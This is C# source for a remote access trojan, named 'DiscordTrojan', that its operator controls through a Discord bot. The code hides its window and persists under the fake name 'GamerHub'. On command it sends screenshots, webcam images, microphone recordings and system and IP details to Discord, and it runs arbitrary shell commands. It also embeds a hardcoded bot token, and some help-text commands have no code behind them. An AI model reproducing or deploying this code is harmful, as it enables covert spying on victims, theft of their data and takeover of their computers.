using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Diagnostics;

using Discord;
using Discord.WebSocket;
using Discord.Commands;
using Discord.Audio;
using Discord.Rest;
using Discord.API;
using Discord.Net;
using Discord.Interactions;
using Discord.Webhook;


using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Sockets;
using System.IO;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Threading;
using System.Linq;
using System.Text;
using System.Collections.Generic;

using NAudio.Wave;


namespace DiscordTrojan
{

    public class Program
    {



        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]

        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string root = @"\AppData\LocalLow";


        bool target = false;

        public static void Main(string[] args)
        => new Program().MainAsync().GetAwaiter().GetResult();





        private DiscordSocketClient _client;

        private bool _isListening = false;



        public async Task MainAsync()
        {

            const int SW_HIDE = 0;
            //const int SW_SHOW = 5;
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            //ShowWindow(handle, SW_SHOW);

            _client = new DiscordSocketClient();
            _client.MessageReceived += CommandHandler;
            _client.Log += Log;

            var token = "NjEzMDIxNjg0Njg5MjcyODMz.GPnEht.NIZ4EkEALBeAGMMULwg_xoGOZWbZOzOq-8C4Os";
            
            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            await Task.Delay(-1);
        }

        private Task Log(LogMessage msg)
        {
            Console.WriteLine(msg.ToString());
            return Task.CompletedTask;
        }

        private Task CommandHandler(SocketMessage message)
        {          

            if (message.Content == "!Target")
            {
                message.Channel.SendMessageAsync("User: " + " " + userPath + "\n");
            }
            if (message.Content == "!Target " + userPath)
            {
                target = true;
                message.Channel.SendMessageAsync(" Targeted " + userPath);
            }
            if (message.Content == "!Untarget" && target == true)
            {
                target = false;
                message.Channel.SendMessageAsync("Untarget " + userPath);
            }
            if (message.Content == "!Untarget " + userPath && target == false)
            {
                message.Channel.SendMessageAsync("You need to target someon in order to untarget!");
            }


            if (target == true)
            {

                if (message.Content == "!Help" || message.Content == "!HELP" || message.Content == "!help")
                {
                    var help = new EmbedBuilder();
                    help.WithTitle("Help");
                    help.WithDescription("!ScreenShot - show photo of desktop\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!Get Files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!Get File (directory) - returns the file you want to download\n\n!StartUp true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera\n\n!WebCamSnap get webcamerapic\n\n!Target choose a target to target/!Untarget User to untarget them\n\n!Cmd command will start cmd and execute it");
                    help.WithColor(Discord.Color.Teal);
                    message.Channel.SendMessageAsync("", false, help.Build());
                }             
                if (message.Content == "!ScreenShot")
                {


                    GetDesktop();
                    message.Channel.SendFileAsync(userPath + root + "\\Capture.jpg");
                    Thread.Sleep(1000);
                    DeleteFunction(userPath + root + "\\Capture.jpg");
                }
                if (message.Content.StartsWith("!Cmd"))
                {
                    string msg = message.ToString();
                    msg = msg.Replace("!Cmd", "/C");
                    message.Channel.SendMessageAsync(msg);
                    Process.Start("cmd.exe", msg);
                }

                if (message.Content == "!Info")
                {
                    message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nIp adress: " + GetIp() + "\nOS version: " + System.Environment.OSVersion + "\nProcessor count: " + System.Environment.ProcessorCount);
                }

                if (message.Content.StartsWith("!MessageBoxError"))
                {
                    string arg = message.Content.Replace("!MessageBoxError", " ");
                    MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    message.Channel.SendMessageAsync("Sent and read");
                }
                if (message.Content.StartsWith("!MessageBoxWarning"))
                {
                    string arg = message.Content.Replace("!MessageBoxWarning", " ");
                    MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    message.Channel.SendMessageAsync("Sent and read");
                }

                if (message.Content.StartsWith("!StartUp true"))
                {
                    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    key.SetValue("GamerHub", $@"{System.Windows.Forms.Application.ExecutablePath}");
                    message.Channel.SendMessageAsync("StartUp true");
                }

                if (message.Content.StartsWith("!StartUp false"))
                {
                    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    key.DeleteValue("GamerHub", false);
                    message.Channel.SendMessageAsync("StartUp false");
                }     

                if (message.Content == "!CameraSnap")
                {
                    try
                    {
                        CameraSnap();
                        message.Channel.SendFileAsync(userPath + root + "\\Capture1.jpg");
                        Thread.Sleep(1000);
                        DeleteFunction(userPath + root + "\\Capture1.jpg");
                    }
                    catch
                    {
                        message.Channel.SendMessageAsync("No camera found");
                    }
                }
                if (message.Content == "!MicRecord")
                {
                    const int audioDurationSeconds = 10;
                    const string audioFileName = "audio.wav";

                    // Set up the WaveInEvent for audio recording
                    using (var waveInEvent = new WaveInEvent())
                    {
                        // Set the desired format for recording (you can adjust these settings as needed)
                        waveInEvent.WaveFormat = new WaveFormat(44100, 1);

                        var buffer = new byte[waveInEvent.WaveFormat.AverageBytesPerSecond * audioDurationSeconds];
                        var bytesRead = 0;

                        // Record audio for the specified duration
                        waveInEvent.DataAvailable += (s, a) =>
                        {
                            Buffer.BlockCopy(a.Buffer, 0, buffer, bytesRead, a.BytesRecorded);
                            bytesRead += a.BytesRecorded;
                            if (bytesRead >= buffer.Length)
                            {
                                waveInEvent.StopRecording();
                            }
                        };

                        var recordingTaskCompletionSource = new TaskCompletionSource<bool>();

                        waveInEvent.RecordingStopped += (s, a) =>
                        {
                            // Save the recorded audio as a WAV file
                            using (var fileWriter = new WaveFileWriter(audioFileName, waveInEvent.WaveFormat))
                            {
                                fileWriter.Write(buffer, 0, bytesRead);
                            }

                            // Sending the audio file to Discord on a separate thread
                            new Thread(() =>
                            {
                                message.Channel.SendFileAsync(audioFileName).ContinueWith(task =>
                                {
                                    // Delete the temporary audio file after sending
                                    File.Delete(audioFileName);
                                    recordingTaskCompletionSource.SetResult(true);
                                });
                            }).Start();
                        };

                        // Start recording
                        waveInEvent.StartRecording();

                        // Wait for the specified duration before stopping recording
                        Thread.Sleep(audioDurationSeconds * 1000);
                    }

                }
            }
            return Task.CompletedTask;
        }


        // ************************ CAMERA ********************************
        // Inside your Program class, add the following implementation for the WebCamSnap() method:
        private void CameraSnap()
        {
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (videoDevices.Count == 0)
            {
                throw new ApplicationException("No video devices found.");
            }

            // Capture snapshots from each video device (webcam)
            for (int i = 0; i < videoDevices.Count; i++)
            {
                VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[i].MonikerString);
                videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                videoSource.Start();

                // Wait for a short duration to allow the camera to capture the image
                Thread.Sleep(1000);

                videoSource.SignalToStop();
                videoSource.WaitForStop();
            }
        }

        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();

            // Use a unique file name for each snapshot
            string fileName = "Capture1.jpg";
            string filePath = Path.Combine(userPath + root, fileName);
            bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Jpeg);
        }

        void GetDesktop()
        {
            Rectangle size = Screen.GetBounds(Point.Empty);
            Bitmap captureBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save(userPath + root + "\\Capture1.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);

        }

        void DeleteFunction(string fileNameToDelete = "")
        {
            try
            {
                if (File.Exists(fileNameToDelete))
                {
                    File.Delete(fileNameToDelete);
                }
            }
            catch
            {

            }
        }
        // ****************************************************************

        string GetIp()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("no");
        }


    }
}
